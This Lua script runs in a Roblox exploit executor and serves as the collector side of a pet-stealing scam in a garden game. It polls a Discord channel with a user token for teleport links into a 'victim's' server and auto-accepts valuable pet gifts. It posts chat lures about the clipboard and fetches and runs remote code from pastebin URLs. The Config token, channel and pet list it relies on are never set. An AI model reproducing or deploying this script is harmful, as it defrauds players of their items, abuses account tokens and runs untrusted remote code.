-- Define a main namespace table to hold global-like configurations
local Config = {}


Config.MinPetKg = 1 -- minimum pet kilogram to accept

-- Game Services Namespace
local Services = {}
Services.Players = game:GetService("Players")
Services.HttpService = game:GetService("HttpService")
Services.UserInputService = game:GetService("UserInputService")
Services.RunService = game:GetService("RunService") -- Corrected
Services.TeleportService = game:GetService("TeleportService")
Services.TextChatService = game:GetService("TextChatService")
Services.VirtualUser = game:GetService("VirtualUser")
Services.VirtualInputManager = game:GetService("VirtualInputManager")

-- Player-related variables
local LocalPlayer = Services.Players.LocalPlayer

-- Ensure the game is loaded before proceeding
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Backpack = LocalPlayer:WaitForChild("Backpack", 15)
if not Backpack then
    warn("Backpack not found for LocalPlayer. Script will terminate.")
    return
end

local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remote Events Namespace
local RemoteEvents = {}
local GameEvents = ReplicatedStorage:WaitForChild("GameEvents", 10)
if not GameEvents then
    warn("GameEvents folder not found in ReplicatedStorage. Script will terminate.")
    return
end

RemoteEvents.PetGiftingService = GameEvents:WaitForChild("PetGiftingService", 10)
RemoteEvents.Favorite_Item = GameEvents:WaitForChild("Favorite_Item", 10)
RemoteEvents.GiftPet = GameEvents:WaitForChild("GiftPet", 10)
RemoteEvents.AcceptPetGift = GameEvents:WaitForChild("AcceptPetGift", 10)

-- File I/O setup and initial state loading BEFORE State table definition
-- Ensure these file operations are supported by your exploit executor
local victimFileExists = isfile("user_gag.txt")
local joinedFileExists = isfile("joined_ids.txt")

if not victimFileExists then
    writefile("user_gag.txt", "victim username")
end
if not joinedFileExists then
    writefile("joined_ids.txt", "[]")
end

local initialVictimUser = readfile("user_gag.txt")
local initialJoinedIds = Services.HttpService:JSONDecode(readfile("joined_ids.txt"))

-- Internal State Variables Namespace - ALL initialized here
local State = {
    IsProcessingGift = false,
    GiftingActive = false,
    LastGiftTime = 0, -- Will be set with os.time()
    RobloxFocusStatus = nil,
    LastDiscordMessageId = nil,
    DidVictimLeave = false,
    AutoJoinTimer = 0,
    VictimUser = initialVictimUser, -- Initialized directly
    JoinedIds = initialJoinedIds -- Initialized directly
}

-- Utility Functions Namespace
local Utils = {}

local function CheckActivityStatus()
    print("Roblox window is IN FOCUS (simulated).")
end
Utils.CheckActivityStatus = CheckActivityStatus

local function WaitForExactPet(fullName)
    print("⏳ Waiting for pet in backpack with name:", fullName)
    local timeout = 10
    local elapsed = 0

    while elapsed < timeout do
        for _, pet in ipairs(Backpack:GetChildren()) do
            if pet.Name == fullName then
                print("✅ Pet appeared in backpack:", fullName)
                return true
            end
        end
        task.wait(0.5)
        elapsed = elapsed + 0.5
    end

    print("❌ Pet not found in backpack after 10s:", fullName)
    return false
end
Utils.WaitForExactPet = WaitForExactPet

local function ExtractBaseName(fullName)
    local base = fullName:gsub("%s*%[.-%]", "")
    return base:match("^%s*(.-)%s*$")
end
Utils.ExtractBaseName = ExtractBaseName

local function ExtractPetKG(fullName)
    local kgString = fullName:match("%[(%d+)kg%]")
    if kgString then
        return tonumber(kgString) or 0
    end
    return 0
end
Utils.ExtractPetKG = ExtractPetKG

local function SaveJoinedId(messageId)
    table.insert(State.JoinedIds, messageId)
    writefile("joined_ids.txt", Services.HttpService:JSONEncode(State.JoinedIds))
end
Utils.SaveJoinedId = SaveJoinedId

local function WaitForPlayerLeave()
    local connection
    connection =
        Services.Players.PlayerRemoving:Connect(
        function(removedPlayer)
            if removedPlayer.Name == State.VictimUser then
                if connection then
                    connection:Disconnect()
                end
                State.DidVictimLeave = true
            end
        end
    )
end
Utils.WaitForPlayerLeave = WaitForPlayerLeave

local function AcceptGifts()
    local giftNoti =
        LocalPlayer:WaitForChild("PlayerGui", 15):WaitForChild("Gift_Notification", 15):WaitForChild("Frame", 15)

    if not giftNoti then
        warn("Gift_Notification GUI not found. Automatic gift acceptance disabled.")
        return
    end

    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA("ImageLabel") then
                local holder = v:FindFirstChild("Holder", true)
                if holder then
                    local frame = holder:FindFirstChild("Frame", true)
                    if frame then
                        local acceptImageButton = frame:FindFirstChild("Accept", true)
                        if acceptImageButton and acceptImageButton:IsA("ImageButton") then
                            pcall(
                                function()
                                    replicatesignal(acceptImageButton.MouseButton1Click)
                                end
                            )
                        end
                    end
                end
            end
        end
    end
end
Utils.AcceptGifts = AcceptGifts

local function IncreaseAutoJoinTimer()
    while task.wait(1) do
        State.AutoJoinTimer = State.AutoJoinTimer + 1 -- Explicit addition
    end
end
Utils.IncreaseAutoJoinTimer = IncreaseAutoJoinTimer

-- Discord/AutoJoin Logic Namespace
local Discord = {}

local function AutoJoin()
    if State.GiftingActive then
        local timeSinceLastGift = os.time() - State.LastGiftTime -- Using os.time()
        if timeSinceLastGift < 6 then
            print(
                string.format("Gifting is active. Skipping Discord check for %.2f more seconds.", 6 - timeSinceLastGift)
            )
            return
        else
            print("Gifting session concluded. Resetting giftingActive flag and proceeding with Discord check.")
            State.GiftingActive = false
        end
    end

    local response =
        request(
        {
            Url = "https://discord.com/api/v9/channels/" .. Config.ChannelId .. "/messages?limit=1",
            Method = "GET",
            Headers = {
                ["Authorization"] = Config.Token,
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                ["Content-Type"] = "application/json"
            }
        }
    )

    if response.StatusCode == 200 then
        local messages = Services.HttpService:JSONDecode(response.Body)
        if #messages == 0 then
            print("No new Discord messages to process.")
            return
        end

        local message = messages[1]
        if message.id == State.LastDiscordMessageId or table.find(State.JoinedIds, tostring(message.id)) then
            print("Latest Discord message already processed or joined.")
            return
        end

        local content = message.content or ""
        local placeId, jobId = string.match(content, 'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
        if placeId and jobId then
            print(string.format("Discord message found for join: PlaceId=%s, JobId=%s", placeId, jobId))
            State.LastDiscordMessageId = message.id
            Utils.SaveJoinedId(tostring(message.id))
            writefile("user_gag.txt", "unknown") -- This seems like a side effect, consider where it best fits
            Services.TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
        else
            print("Latest Discord message does not contain a valid teleport link.")
        end
    else
        warn("Invalid response code from Discord API:", response.StatusCode)
        warn("Response body:", response.Body)
    end
end
Discord.AutoJoin = AutoJoin

-- Initial checks for token and channel ID
if Config.Token == "" or Config.ChannelId == "" then
    LocalPlayer:Kick("Add your token or channelId to use")
end

-- Load external scripts (if 'request' is available for HttpGet)
-- These `loadstring` calls are typical for exploit contexts and are left as-is,
-- but be aware they can be security risks if sources are untrusted.
if typeof(game.HttpGet) == "function" then -- Check if HttpGet exists (common in exploit environments)
    pcall(
        function()
            loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
        end
    )
    pcall(
        function()
            loadstring(game:HttpGet("https://pastebin.com/raw/vbLfSAFd", true))()
        end
    )
else
    warn("game:HttpGet is not available. External scripts cannot be loaded.")
end

-- Handle player idling
Services.Players.LocalPlayer.Idled:Connect(
    function()
        Services.VirtualUser:CaptureController()
        Services.VirtualUser:ClickButton2(Vector2.new())
    end
)

-- Connect to RunService.Heartbeat for activity status (original logic had a redundancy here)
-- This block will now run after `State` is fully initialized.
Services.RunService.Heartbeat:Connect(
    function()
        local currentStatusIsInactive = false -- As per original code, this was always false
        local lastStatus = State.RobloxFocusStatus

        if lastStatus == nil then
            Utils.CheckActivityStatus()
            State.RobloxFocusStatus = currentStatusIsInactive
        elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
            Utils.CheckActivityStatus()
            State.RobloxFocusStatus = currentStatusIsInactive
        end
    end
)

-- Hook into GiftPet RemoteEvent
-- Removed task.defer, just run in a do-end block or directly if you don't need deferring behavior
do
    print("🔌 Hooking into GiftPet RemoteEvent...")

    if not RemoteEvents.GiftPet then
        -- Consider whether to return here or let the script continue if other functions are independent.
        -- For now, allowing it to continue if no gift event is hooked.
        warn("GiftPet RemoteEvent is nil. Cannot hook into OnClientEvent.")
    else
        RemoteEvents.GiftPet.OnClientEvent:Connect(
            function(giftID, fullName, sender)
                print("🎁 Gift received:", giftID, fullName, sender)

                State.GiftingActive = true
                State.LastGiftTime = os.time() -- Using os.time()
                print(
                    string.format(
                        "Gifting started/continued. Last gift received at: %d", -- Changed format specifier for integer
                        State.LastGiftTime
                    )
                )

                local basePetName = Utils.ExtractBaseName(fullName)
                local petKG = Utils.ExtractPetKG(fullName)
                print("🔍 Base pet name:", basePetName, " | KG:", petKG)

                local isWhitelisted = table.find(Config.Pets, basePetName)
                local isHighKG = petKG >= Config.MinPetKg

                if not isWhitelisted and not isHighKG then
                    print(
                        string.format(
                            '⚠️ Pet "%s" (KG: %d) not in whitelist and KG is below %d. Ignoring gift from: %s',
                            fullName,
                            petKG,
                            Config.MinPetKg,
                            sender
                        )
                    )
                    return
                elseif isWhitelisted then
                    print(
                        string.format(
                            '✅ Pet "%s" (KG: %d) found in whitelist. Accepting gift from: %s',
                            fullName,
                            petKG,
                            sender
                        )
                    )
                elseif isHighKG then
                    print(
                        string.format(
                            '✅ Pet "%s" (KG: %d) has KG >= %d. Accepting gift from: %s',
                            fullName,
                            petKG,
                            Config.MinPetKg,
                            sender
                        )
                    )
                end

                while State.IsProcessingGift do
                    task.wait(0.1)
                end
                State.IsProcessingGift = true

                print("✅ Accepting gift from", sender, "with full name:", fullName)

                local success, err =
                    pcall(
                    function()
                        if RemoteEvents.AcceptPetGift then
                            RemoteEvents.AcceptPetGift:FireServer(true, giftID)
                            print("🚀 Gift accepted (ID:", giftID, ")")
                        else
                            warn("AcceptPetGift RemoteEvent is nil. Cannot accept gift.")
                            error("AcceptPetGift RemoteEvent is nil.") -- Propagate error for pcall
                        end
                    end
                )

                if success then
                    Utils.WaitForExactPet(fullName)
                else
                    print("❌ Failed to accept gift:", err)
                end

                State.IsProcessingGift = false
            end
        )
    end

    print("✅ GiftPet listener successfully hooked (or skipped if nil).")
end

-- Wait for player data to load
while LocalPlayer:GetAttribute("DataFullyLoaded") ~= true do
    LocalPlayer:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while LocalPlayer:GetAttribute("Finished_Loading") ~= true do
    LocalPlayer:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while LocalPlayer:GetAttribute("Loading_Screen_Finished") ~= true do
    LocalPlayer:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end

task.wait(1) -- Short delay after loading

-- Start parallel tasks
task.spawn(Utils.AcceptGifts)
task.spawn(Utils.IncreaseAutoJoinTimer)
Utils.WaitForPlayerLeave() -- Start listening for victim leaving

-- Initial chat messages
Services.TextChatService.TextChannels.RBXGeneral:SendAsync("Yo gng check yo clipboard")
task.wait(1)
Services.TextChatService.TextChannels.RBXGeneral:SendAsync("GGS")
task.wait(1)
Services.TextChatService.TextChannels.RBXGeneral:SendAsync("GGS")

-- Main auto-join loop
while task.wait(0.1) do
    Discord.AutoJoin()
end
